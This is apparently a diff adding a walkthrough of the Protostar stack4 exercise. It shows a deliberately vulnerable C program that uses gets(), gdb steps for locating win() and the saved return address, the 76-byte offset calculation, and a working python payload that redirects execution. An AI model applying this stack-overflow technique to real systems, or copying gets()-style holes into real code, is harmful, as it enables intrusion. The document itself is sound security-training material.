@@ -1,0 +1,60 @@
+/opt/protostar/bin/stack4
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+
+
+Not too much to play with in this level. We only have a buffer and gets function, that of course lets us write as many bytes as we want. What can we do with it? There is the win() function in memory, so we have an option to jump there by overwriting return address from some other function. Let's try jumping from main :)
+
+First of all, let's find out the location of function we want to jump to.
+> gdb stack4
+> start
+> p win
+> $1 = {void (void)} 0x80483f4 <win>
+
+In order to understand why is it possible to overwrite return address you can do some reading here: https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames
+
+In short: return address is stored on stack before function is called, so it is possible to return to part of program that was being executed earlier. It is stored at EBP+4. We can check it's value at the end of execution by breaking at leave instrucin in gdb and typing info registers (before stack frame is changed). Let's start:
+> gdb stack4
+> start
+> disassemble
+Leave instruction is at 0x0804841d.
+> b *0x0804841d
+> continue
+> (waits for our input, gets is being executed) asd
+> info registers
+> ebp = 0xbffff7c8
+> p $ebp+4 (0xbffff7cc)
+
+To understand a little bit better what's going on we could also take a look at the stack with some more input.
+
+> run
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+> x/32x $esp
+
+We can see a lot of 0x41414141 on the stack. Our buffer starts at 0xbffff780 and grows towards higher addresses. As we checked before, return address is stored at 0xbffff7cc.
+Let's calculate how many bytes we need to input to overwrite it's current value (0xbffff848)
+
+0xbffff7cc - 0xbffff780 = 76 bytes (return pointer starts after 76 bytes)
+If we just write 76 bytes (python -c "print('A'*76)" | ./stack4) we will get a segmentation fault, due to \00 byte at the end of the string overwriting one byte of return address.
+
+Now we have all we need. Let's execute python command with win() function address as a payload.
+> python -c "print('A'*76 + '\xf4\x83\x04\x08')" | ./stack4
+> code flow successfully changed
+> segmentation fault
+
+So the program crashed, but that's to be expected. After all when it's finished executing win() function it goes back and tries executing commands after overwritten return pointer. But we accomplished our goal - win function was executed. 
